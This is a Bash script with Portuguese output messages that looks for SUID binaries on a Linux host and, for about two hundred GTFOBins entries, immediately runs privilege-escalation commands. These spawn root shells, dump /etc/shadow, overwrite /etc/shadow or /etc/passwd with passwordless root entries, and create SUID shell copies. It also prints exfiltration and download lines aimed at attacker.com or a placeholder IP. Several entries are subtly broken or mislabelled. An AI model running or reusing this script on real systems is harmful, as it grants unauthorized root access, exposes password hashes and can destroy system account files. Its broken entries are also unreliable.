#!/bin/bash

echo "[*] Procurando binários SUID do GTFOBins..."

SUIDS=$(find / -perm -u=s -type f 2>/dev/null)
echo "$SUIDS"
for path in $SUIDS; do
    bin=$(basename "$path")

    case "$bin" in
        bash)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            "$path" -p
            ;;
        aa-exec)
            echo "[+] $path → aa-exec SUID encontrado!"
            "$path" /bin/sh -p
            ;;
        ab)
            echo "[+] $path → ab SUID encontrado! Teste:"
            echo "URL=http://attacker.com/"
            echo "LFILE=file_to_send"
            echo "ab -p $LFILE $URL"
            ;;
        agetty)
            echo "[+] $path → agetty SUID encontrado! Teste:"
            "$path" -o -p -l /bin/sh -a root tty
            ;;
        alpine)
            echo "[+] $path → alpine SUID encontrado! Teste:"
            "$path" -F /etc/shadow
            ;;
        ar)
            echo "[+] $path → ar SUID encontrado! Teste:"
            TF=$(mktemp -u)
            "$path" r "$TF" /etc/shadow
            cat "$TF"
            rm -f "$TF" 2>/dev/null
            ;;
        arj)
            echo "[+] $path → arj SUID encontrado! Teste:"
            TF=$(mktemp -d)
            echo 'zero::666:0:99999:7:::' > "$TF/shadow"
            echo 'zero:x:1337:0::/root:/bin/bash' > "$TF/passwd"

            "$path" a "$TF/a" "$TF/shadow"
            "$path" a "$TF/a" "$TF/passwd"
            "$path" e "$TF/a" /etc

            sleep 1
            echo "[*] Tentando acessar com su zero:"
            su zero
            id       
            ;;
        arp)
            echo "[+] $path → arp SUID encontrado! Teste:"
            "$path" -v -f /etc/shadow
            ;;
        as)
            echo "[+] $path → as SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" @$LFILE
            ;;
        ascii-xfr)
            echo "[+] $path → ascii-xfr SUID encontrado! Teste:"
            "$path" -ns /etc/shadow
            ;;
        ash)
            echo "[+] $path → ash SUID encontrado! Teste:"
            "$path" 
            ;;
        aspell)
            echo "[+] $path → aspell SUID encontrado! Teste:"
            "$path" -c /etc/shadow
            ;;
        atobm)
            echo "[+] $path → atobm SUID encontrado! Teste:"
            "$path" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
            ;;
        awk)
            echo "[+] $path → awk SUID encontrado! Teste:"
            "$path" '//' /etc/shadow
            "$path" 'BEGIN {system("/bin/sh")}'
            id
            ;;
        base32)
            echo "[+] $path → base32 SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        base64)
            echo "[+] $path → base64 SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        basenc)
            echo "[+] $path → basenc SUID encontrado! Teste:"
            "$path" --base64 /etc/shadow | "$path" -d --base64
            ;;
        basez)
            echo "[+] $path → basez SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        bc)
            echo "[+] $path → bc SUID encontrado! Teste:"
            "$path" -s /etc/shadow
            quit
            ;;
        bridge)
            echo "[+] $path → bridge SUID encontrado! Teste:"
            "$path" -b /etc/shadow
            ;;
        busctl)
            echo "[+] $path → busctl SUID encontrado! Teste:"
            "$path" set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
            ;;
        busybox)
            echo "[+] $path → busybox SUID encontrado! Teste:"
            "$path" sh
            ;;
        bzip2)
            echo "[+] $path → bzip2 SUID encontrado! Teste:"
            "$path" -c /etc/shadow | "$path" -d
            ;;
        cabal)
            echo "[+] $path → cabal SUID encontrado! Teste:"
            "$path" exec -- /bin/sh -p
            ;;
        capsh)
            echo "[+] $path → capsh SUID encontrado! Teste:"
            "$path" --gid=0 --uid=0 --
            ;;
        cat)
            echo "[+] $path → cat SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        chmod)
            echo "[+] $path → chmod SUID encontrado! Teste:"
            "$path" chmod /etc/shadow
            ;;
        chown)
            echo "[+] $path → chown SUID encontrado! Teste:"
            cp /bin/bash /tmp/sh
            "$path" root:root /tmp/sh
            chmod +s /tmp/sh
            /tmp/sh -p
            ;;
        choom)
            echo "[+] $path → choom SUID encontrado! Teste:"
            "$path" -n 0 -- /bin/sh -p
            ;;
        chroot)
            echo "[+] $path → chroot SUID encontrado! Teste:"
            "$path" / /bin/sh -p
            ;;
        clamscan)
            echo "[+] $path → clamscan SUID encontrado! Teste:"
            LFILE=/etc/shadow
            TF=$(mktemp -d)
            touch $TF/empty.yara
            "$path" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
            ;;
        cmp)
            echo "[+] $path → cmp SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/zero -b -l
            ;;
        column)
            echo "[+] $path → column SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        comm)
            echo "[+] $path → comm SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/null 2>/dev/null
            ;;
        cp)
            echo "[+] $path → cp SUID encontrado! Teste:"
            echo "gtfobins.github.io/gtfobins/cp/"
            ;;
        cpio)
            echo "[+] $path → cpio SUID encontrado! Teste:"
            LFILE=/etc/shadow
            TF=$(mktemp -d)
            echo "$LFILE" | "$path" -R $UID -dp $TF
            cat "$TF/$LFILE"
            ;;
        cpulimit)
            echo "[+] $path → cpulimit SUID encontrado! Teste:"
            "$path" -l 100 -f -- /bin/sh -p
            ;;
        csh)
            echo "[+] $path → csh SUID encontrado! Teste:"
            "$path" -b
            ;;
        csplit)
            echo "[+] $path → csplit SUID encontrado! Teste:"
            "$path" /etc/shadow 1
            cat xx01
            ;;
        csvtool)
            echo "[+] $path → csvtool SUID encontrado! Teste:"
            "$path" trim t /etc/shadow
            ;;
        cupsfilter)
            echo "[+] $path → cupsfilter SUID encontrado! Teste:"
            "$path" -i application/octet-stream -m application/octet-stream /etc/shadow
            ;;
        curl)
            echo "[+] $path → curl SUID encontrado! Teste:"
            echo "URL=http://attacker.com/file_to_get"
            echo "LFILE=file_to_save"
            echo "./curl $URL -o $LFILE"
            ;;
        cut)
            echo "[+] $path → cut SUID encontrado! Teste:"
            "$path" -d "" -f1 /etc/shadow
            ;;
        dash)
            echo "[+] $path → dash SUID encontrado! Teste:"
            "$path" -p
            ;;
        date)
            echo "[+] $path → date SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        dd)
            echo "[+] $path → dd SUID encontrado! Teste:"
            echo "data" | "$path" of=/etc/shadow
            ;;
        debugfs)
            echo "[+] $path → debugfs SUID encontrado! Teste:"
            "$path"
            !/bin/sh
            ;;        
        dialog)
            echo "[+] $path → dialog SUID encontrado! Teste:"
            "$path" --textbox /etc/shadow 0 0
            ;;
        diff)
            echo "[+] $path → diff SUID encontrado! Teste:"
            "$path" --line-format=%L /dev/null /etc/shadow
            ;;
        dig)
            echo "[+] $path → dig SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        distcc)
            echo "[+] $path → distcc SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        dmsetup)
            echo "[+] $path → dmsetup SUID encontrado! Teste:"
            echo "dmsetup create base <<EOF"
            echo "0 3534848 linear /dev/loop0 94208"
            echo "EOF"
            echo "dmsetup ls --exec '/bin/sh -p -s'"
            ;;
        docker)
            echo "[+] $path → docker SUID encontrado! Teste:"
            "$path" run -v /:/mnt --rm -it alpine chroot /mnt sh
            ;;        
        dosbox)
            echo "[+] $path → dosbox SUID encontrado! Teste:"
            echo "LFILE='\path\to\file_to_write'"
            echo "dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit"
            ;;
        ed)
            echo "[+] $path → ed SUID encontrado! Teste:"
            "$path" /etc/shadow
            ,p
            q 
            ;;
        efax)
            echo "[+] $path → efax SUID encontrado! Teste:"
            "$path" -d /etc/shadow
            ;;
        elvish)
            echo "[+] $path → elvish SUID encontrado! Teste:"
            "$path"
            ;;
        emacs)
            echo "[+] $path → emacs SUID encontrado! Teste:"
            "$path" -Q -nw --eval '(term "/bin/sh -p")'
            ;;
        env)
            echo "[+] $path → env SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        eqn)
            echo "[+] $path → eqn SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;        
        espeak)
            echo "[+] $path → espeak SUID encontrado! Teste:"
            "$path" -qXf /etc/shadow
            ;;
        expand)
            echo "[+] $path → expand SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        expect)
            echo "[+] $path → expect SUID encontrado! Teste:"
            "$path" -c 'spawn /bin/sh -p;interact'
            ;;
        file)
            echo "[+] $path → file SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        find)
            echo "[+] $path → find SUID encontrado! Teste:"
            "$path" . -exec /bin/sh -p \; -quit
            ;;
        fish)
            echo "[+] $path → fish SUID encontrado! Teste:"
            "$path"
            ;;
        flock)
            echo "[+] $path → flock SUID encontrado! Teste:"
            "$path" -u / /bin/sh -p
            ;;        
        fmt)
            echo "[+] $path → fmt SUID encontrado! Teste:"
            "$path" -999 /etc/shadow
            ;;
        fold)
            echo "[+] $path → fold SUID encontrado! Teste:"
            "$path" -w99999999 /etc/shadow
            ;;
        gawk)
            echo "[+] $path → gawk SUID encontrado! Teste:"
            "$path" '//' "/etc/shadow"
            ;;
        gcore)
            echo "[+] $path → gcore SUID encontrado! Teste:"
            echo "Busque um processo rodando como root para usar"
            echo ""$path" $PID"
            ;;
        gdb)
            echo "[+] $path → gdb SUID encontrado! Teste:"
            "$path" -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
            ;;
        genie)
            echo "[+] $path → genie SUID encontrado! Teste:"
            "$path" -c '/bin/sh'
            ;;
        genisoimage)
            echo "[+] $path → genisoimage SUID encontrado! Teste:"
            "$path" -sort /etc/shadow
            ;;        
        gimp)
            echo "[+] $path → gimp SUID encontrado! Teste:"
            "$path" -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
            ;;
        grep)
            echo "[+] $path → grep SUID encontrado! Teste:"
            "$path" '' /etc/shadow
            ;;
        gtester)
            echo "[+] $path → gtester SUID encontrado! Teste:"
            TF=$(mktemp)
            echo '#!/bin/sh -p' > $TF
            echo 'exec /bin/sh -p 0<&1' >> $TF
            chmod +x $TF
            sudo "$path" -q $TF
            ;;
        gzip)
            echo "[+] $path → gzip SUID encontrado! Teste:"
            "$path" -f /etc/shadow -t
            ;;
        hd)
            echo "[+] $path → hd SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        head)
            echo "[+] $path → head SUID encontrado! Teste:"
            "$path" -c1G /etc/shadow
            ;;
        hexdump)
            echo "[+] $path → hexdump SUID encontrado! Teste:"
            "$path" -C /etc/shadow
            ;;        
        highlight)
            echo "[+] $path → highlight SUID encontrado! Teste:"
            "$path" --no-doc --failsafe /etc/shadow
            ;;
        hping3)
            echo "[+] $path → hping3 SUID encontrado! Teste:"
            "$path"
            /bin/sh -p
            ;;
        iconv)
            echo "[+] $path → iconv SUID encontrado! Teste:"
            "$path" -f 8859_1 -t 8859_1 /etc/shadow
            ;;
        install)
            echo "[+] $path → install SUID encontrado! Teste:"
            "$path" -o root -g root -m 6777 /bin/bash ./suidbash
            ./suidbash -p
            ;;
        ionice)
            echo "[+] $path → ionice SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        ip)
            echo "[+] $path → ip SUID encontrado! Teste:"
            "$path" -force -batch /etc/shadow
            ;;
        ispell)
            echo "[+] $path → ispell SUID encontrado! Teste:"
            "$path" /etc/passwd
            !/bin/sh -p
            ;;        
        jjs)
            echo "[+] $path → jjs SUID encontrado! Teste:"
            echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | "$path"
            ;;
        join)
            echo "[+] $path → join SUID encontrado! Teste:"
            "$path" -a 2 /dev/null /etc/shadow
            ;;
        jq)
            echo "[+] $path → jq SUID encontrado! Teste:"
            "$path" -Rr . /etc/shadow
            ;;
        jrunscript)
            echo "[+] $path → jrunscript SUID encontrado! Teste:"
            "$path" -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
            ;;
        julia)
            echo "[+] $path → julia SUID encontrado! Teste:"
            "$path" -e 'run(`/bin/sh -p`)'
            ;;
        ksh)
            echo "[+] $path → ksh SUID encontrado! Teste:"
            "$path" -p
            ;;
        ksshell)
            echo "[+] $path → ksshell SUID encontrado! Teste:"
            "$path" -i /etc/shadow
            ;;
        kubectl)
            echo "[+] $path → kubectl SUID encontrado! Teste:"
            echo "LFILE=/etc"
            echo "./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
            echo "Acesse o arquivo com curl http://127.0.0.1:444/x/shadow"            
            ;;
        ld.so)
            echo "[+] $path → ld.so SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        less)
            echo "[+] $path → less SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        links)
            echo "[+] $path → links SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        logsave)
            echo "[+] $path → logsave SUID encontrado! Teste:"
            "$path" /dev/null /bin/sh -i -p
            ;;
        look)
            echo "[+] $path → look SUID encontrado! Teste:"
            "$path" '' /etc/shadow
            ;;
        lua)
            echo "[+] $path → lua SUID encontrado! Teste:"
            "$path" -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
            ;;
        make)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            cmd='/bin/sh -p'
            "$path" -s --eval=$'x:\n\t-'"$cmd"
            ;;
        mawk)
            echo "[+] $path → mawk SUID encontrado! Teste:"
            "$path" '//' /etc/shadow
            ;;
        minicom)
            echo "[+] $path → minicom SUID encontrado! Teste:"
            "$path" -D /dev/null
            ;;
        more)
            echo "[+] $path → more SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        mosquitto)
            echo "[+] $path → mosquitto SUID encontrado! Teste:"
            "$path" -c /etc/shadow
            ;;
        msgattrib)
            echo "[+] $path → msgattrib SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        msgcat)
            echo "[+] $path → msgcat SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        msgconv)
            echo "[+] $path → msgconv SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        msgfilter)
            echo "[+] $path → msgfilter SUID encontrado! Teste:"
            echo x | "$path" -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
            ;;
        msgmerge)
            echo "[+] $path → msgmerge SUID encontrado! Teste:"
            "$path" -P /etc/shadow /dev/null
            ;;
        msguniq)
            echo "[+] $path → msguniq SUID encontrado! Teste:"
            "$path" -P /etc/shadow
            ;;
        multitime)
            echo "[+] $path → multitime SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        mv)
            echo "[+] $path → mv SUID encontrado! Teste zerar a senha do root:"
            echo "LFILE=/etc/shadow"
            echo "TF=$(mktemp)"
            echo "echo "root::0:0:root:/root:/bin/bash" > $TF"
            echo ""$path" $TF $LFILE"
            ;;
        nasm)
            echo "[+] $path → nasm SUID encontrado! Teste:"
            "$path" -@ /etc/shadow
            ;;
        nawk)
            echo "[+] $path → nawk SUID encontrado! Teste:"
            "$path" '//' /etc/shadow
            ;;
        ncftp)
            echo "[+] $path → ncftp SUID encontrado! Teste:"
            "$path"
            !/bin/sh -p
            ;;
        nft)
            echo "[+] $path → nft SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        nice)
            echo "[+] $path → nice SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        nl)
            echo "[+] $path → nl SUID encontrado! Teste:"
            "$path" -bn -w1 -s '' /etc/shadow
            ;;
        nm)
            echo "[+] $path → nm SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" @$LFILE
            ;;
        nmap)
            echo "[+] $path → nmap SUID encontrado! Teste:"
            "$path" --version
            echo "[+] Versão < 5.21 tem --interactive  !sh"
            echo "ou"
            echo "LFILE=file_to_write"
            echo "./nmap -oG=$LFILE DATA"
            ;;
        node)
            echo "[+] $path → node SUID encontrado! Teste:"
            "$path" -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
            ;;
        nohup)
            echo "[+] $path → nohup SUID encontrado! Teste:"
            "$path" /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
            ;;
        ntpdate)
            echo "[+] $path → ntpdate SUID encontrado! Teste:"
            "$path" -a x -k /etc/shadow -d localhost
            ;;
        od)
            echo "[+] $path → od SUID encontrado! Teste:"
            "$path" -An -c -w9999 /etc/shadow
            ;;
        openssl)
            echo "[+] $path → openssl SUID encontrado! Teste:"
            echo "[+] Tem a opção de shell"
            echo "[+] OU"
            echo "[+] LFILE=file_to_write"
            echo "[+] echo DATA | openssl enc -out "$LFILE""
            ;;
        openvpn)
            echo "[+] $path → openvpn SUID encontrado! Teste:"
            "$path" --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
            ;;
        pandoc)
            echo "[+] $path → pandoc SUID encontrado! Teste:"
            echo "[+] LFILE=file_to_write"
            echo "[+] echo DATA | ./pandoc -t plain -o "$LFILE""
            ;;
        paste)
            echo "[+] $path → paste SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        perf)
            echo "[+] $path → perf SUID encontrado! Teste:"
            "$path" stat /bin/sh -p
            ;;
        perl)
            echo "[+] $path → perl SUID encontrado! Teste:"
            "$path" -e 'exec "/bin/sh";'
            ;;
        pexec)
            echo "[+] $path → pexec SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        pg)
            echo "[+] $path → pg SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        php)
            echo "[+] $path → php SUID encontrado! Teste:"
            CMD="/bin/sh"
            "$path" -r "pcntl_exec('/bin/sh', ['-p']);"
            ;;
        pidstat)
            echo "[+] $path → pidstat SUID encontrado! Teste:"
            cmd=id
            "$path" -e $cmd
            ;;
        pr)
            echo "[+] $path → pr SUID encontrado! Teste:"
            "$path" -T /etc/shadow
            ;;
        ptx)
            echo "[+] $path → ptx SUID encontrado! Teste:"
            "$path" -w 5000 /etc/shadow
            ;;
        python | python3)
            echo "[+] $path → python SUID encontrado! Teste:"
            "$path" -c 'import os; os.execl("/bin/sh", "sh", "-p")'
            ;;
        rc)
            echo "[+] $path → rc SUID encontrado! Teste:"
            "$path" -c '/bin/sh -p'
            ;;
        readelf)
            echo "[+] $path → readelf SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" -a @$LFILE
            ;;
        restic)
            echo "[+] $path → restic SUID encontrado! Teste:"
            echo "RHOST=yourIP"
            echo "RPORT=12345"
            echo "LFILE=file_or_dir_to_get"
            echo "NAME=backup_name"
            echo "restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE""
            ;;
        rev)
            echo "[+] $path → rev SUID encontrado! Teste:"
            "$path" /etc/shadow | rev
            ;;
        rlwrap)
            echo "[+] $path → rlwrap SUID encontrado! Teste:"
            "$path" -H /dev/null /bin/sh -p
            ;;
        rsync)
            echo "[+] $path → rsync SUID encontrado! Teste:"
            "$path" -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
            ;;
        rtorrent)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~"$path"
            "$path"
            ;;
        run-parts)
            echo "[+] $path → run-parts SUID encontrado! Teste:"
            "$path" --new-session --regex '^sh$' /bin --arg='-p'
            ;;
        rview)
            echo "[+] $path → rview SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        rvim)
            echo "[+] $path → rvim SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        sash)
            echo "[+] $path → sash SUID encontrado! Teste:"
            "$path"
            ;;
        scanmem)
            echo "[+] $path → scanmem SUID encontrado! Teste:"
            "$path"
            shell /bin/sh
            ;;
        sed)
            echo "[+] $path → sed SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" -e '' "$LFILE"
            ;;
        setarch)
            echo "[+] $path → setarch SUID encontrado! Teste:"
            "$path" $(arch) /bin/sh -p
            ;;
        setfacl)
            echo "[+] $path → setfacl SUID encontrado! Teste:"
            "$path" -m u:$(whoami):rwx /etc/shadow
            ;;
        setlock)
            echo "[+] $path → setlock SUID encontrado! Teste:"
            "$path" - /bin/sh -p
            ;;
        shuf)
            echo "[+] $path → shuf SUID encontrado! Teste:"
            echo "LFILE=file_to_write"
            echo "shuf -e DATA -o "$LFILE""
            ;;
        soelim)
            echo "[+] $path → soelim SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        softlimit)
            echo "[+] $path → softlimit SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        sort)
            echo "[+] $path → sort SUID encontrado! Teste:"
            "$path" -m /etc/shadow
            ;;
        sqlite3)
            echo "[+] $path → sqlite3 SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" << EOF
            CREATE TABLE t(line TEXT);
            .import $LFILE t
            SELECT * FROM t;
EOF
            ;;
        ss)
            echo "[+] $path → ss SUID encontrado! Teste:"
            "$path" -a -F /etc/shadow
            ;;
        ssh-agent)
            echo "[+] $path → ssh-agent SUID encontrado! Teste:"
            "$path" /bin/ -p
            ;;
        ssh-keygen)
            echo "[+] $path → ssh-keygen SUID encontrado! Teste:"
            "$path" -D ./lib.so
            ;;
        ssh-keyscan)
            echo "[+] $path → ssh-keyscan SUID encontrado! Teste:"
            "$path" -f /etc/shadow
            ;;
        sshpassb)
            echo "[+] $path → sshpass SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        start-stop-daemon)
            echo "[+] $path → start-stop-daemon SUID encontrado! Teste:"
            "$path" -n $RANDOM -S -x /bin/sh -- -p
            ;;
        stdbuf)
            echo "[+] $path → stdbuf SUID encontrado! Teste:"
            "$path" -i0 /bin/sh -p
            ;;
        strace)
            echo "[+] $path → strace SUID encontrado! Teste:"
            "$path" -o /dev/null /bin/sh -p
            ;;
        strings)
            echo "[+] $path → strings SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        sysctl)
            echo "[+] $path → sysctl SUID encontrado! Teste:"
            cmd='/bin/sh -c id>/tmp/id'
            ./sysctl "kernel.core_pattern=|$cmd"
            sleep 9999 &
            kill -QUIT $!
            cat /tmp/id
            ;;
        systemctl)
            echo "[+] $path → systemctl SUID encontrado! Teste:"
            TF=$(mktemp).service
            echo '[Service]
            Type=oneshot
            ExecStart=/bin/sh -c "id > /tmp/output"
            [Install]
            WantedBy=multi-user.target' > $TF
            "$path" link $TF
            "$path" enable --now $TF
            cat /tmp/output
            ;;
        tac)
            echo "[+] $path → tac SUID encontrado! Teste:"
            "$path" -s 'RANDOM' /etc/shadow
            ;;
        tail)
            echo "[+] $path → tail SUID encontrado! Teste:"
            "$path" -c1G /etc/shadow
            ;;
        taskset)
            echo "[+] $path → taskset SUID encontrado! Teste:"
            "$path" 1 /bin/sh -p
            ;;
        tbl)
            echo "[+] $path → tbl SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        tclsh)
            echo "[+] $path → tclsh SUID encontrado! Teste:"
            "$path"
            exec /bin/sh -p <@stdin >@stdout 2>@stderr
            ;;
        tee)
            echo "[+] $path → tee SUID encontrado! Teste:"
            echo "LFILE=file_to_write"
            echo "echo DATA | ./tee -a "$LFILE""
            ;;
        terraform)
            echo "[+] $path → terraform SUID encontrado! Teste:"
            "$path" console
            file("/etc/shadow")
            ;;
        tftp)
            echo "[+] $path → tftp SUID encontrado! Teste:"
            echo "RHOST=attacker.com"
            echo "./tftp $RHOST"
            echo "put file_to_send"
            ;;
        tic)
            echo "[+] $path → tic SUID encontrado! Teste:"
            "$path" -C /etc/shadow
            ;;
        time)
            echo "[+] $path → time SUID encontrado! Teste:"
            "$path" /bin/sh -p
            ;;
        timeout)
            echo "[+] $path → timeout SUID encontrado! Teste:"
            "$path" 7d /bin/sh -p
            ;;
        troff)
            echo "[+] $path → troff SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        ul)
            echo "[+] $path → ul SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        unexpand)
            echo "[+] $path → unexpand SUID encontrado! Teste:"
            "$path" -t99999999 /etc/shadow
            ;;
        uniq)
            echo "[+] $path → uniq SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        unshare)
            echo "[+] $path → unshare SUID encontrado! Teste:"
            "$path" -r /bin/sh
            ;;
        unsquashfs)
            echo "[+] $path → unsquashfs SUID encontrado! Teste:"
            "$path" shell
            squashfs-root/sh -p
            ;;
        unzip)
            echo "[+] $path → unzip SUID encontrado! Teste:"
            echo "./unzip -K shell.zip"
            echo "./sh -p"
            ;;
        update-alternatives)
            echo "[+] $path → update-alternatives SUID encontrado! Teste:"
            echo "LFILE=/path/to/file_to_write"
            echo "TF=$(mktemp)"
            echo "echo DATA >$TF"
            echo "update-alternatives --force --install "$LFILE" x "$TF" 0"
            ;;
        uudecode)
            echo "[+] $path → uudecode SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/stdout | "$path"
            ;;
        uuencode)
            echo "[+] $path → uuencode SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/stdout | "$path"
            ;;
        vagrant)
            echo "[+] $path → vagrant SUID encontrado! Teste:"
            cd $(mktemp -d)
            echo 'exec "/bin/sh -p"' > Vagrantfile
            "$path" up
            ;;
        varnishncsa)
            echo "[+] $path → varnishncsa SUID encontrado! Teste:"
            cp /etc/passwd /tmp/passwd_bk
            echo "Realizado backup de passwd em tmp"
            LFILE=/etc/passwd
            "$path" -g request -q 'ReqURL ~ "/xxx"' -F 'root::0:0:root:/root:/bin/bash' -w "$LFILE"
            su root
            ;;
        view)
            echo "[+] $path → view SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        vigr)
            echo "[+] $path → vigr SUID encontrado! Teste:"
            "$path"
            ;;
        vim)
            echo "[+] $path → vim SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        vimdiff)
            echo "[+] $path → vimdiff SUID encontrado! Teste:"
            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        vipw)
            echo "[+] $path → vipw SUID encontrado! Teste:"
            "$path"
            ;;
        w3m)
            echo "[+] $path → w3m SUID encontrado! Teste:"
            "$path" /etc/shadow -dump
            ;;
        watch)
            echo "[+] $path → watch SUID encontrado! Teste:"
            "$path" -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
            ;;
        wc)
            echo "[+] $path → wc SUID encontrado! Teste:"
            "$path" --files0-from /etc/shadow
            ;;
        wget)
            echo "[+] $path → wget SUID encontrado! Teste:"
            TF=$(mktemp)
            chmod +x $TF
            echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
            "$path" --use-askpass=$TF 0
            ;;
        whiptail)
            echo "[+] $path → whiptail SUID encontrado! Teste:"
            "$path" --textbox --scrolltext /etc/shadow 0 0
            ;;
        xargs)
            echo "[+] $path → xargs SUID encontrado! Teste:"
            "$path" -a /dev/null sh -p
            ;;
        xdotool)
            echo "[+] $path → xdotool SUID encontrado! Teste:"
            "$path" exec --sync /bin/sh -p
            ;;
        xmodmap)
            echo "[+] $path → xmodmap SUID encontrado! Teste:"
            "$path" -v /etc/shadow
            ;;
        xmore)
            echo "[+] $path → xmore SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        xxd)
            echo "[+] $path → xxd SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" -r
            ;;
        xz)
            echo "[+] $path → xz SUID encontrado! Teste:"
            "$path" -c /etc/shadow | "$path" -d
            ;;
        yash)
            echo "[+] $path → yash SUID encontrado! Teste:"
            "$path"
            ;;
        zsh)
            echo "[+] $path → zsh SUID encontrado! Teste:"
            "$path"
            ;;
        zsoelim)
            echo "[+] $path → zsoelim SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;

        *)
            ;;
    esac
done
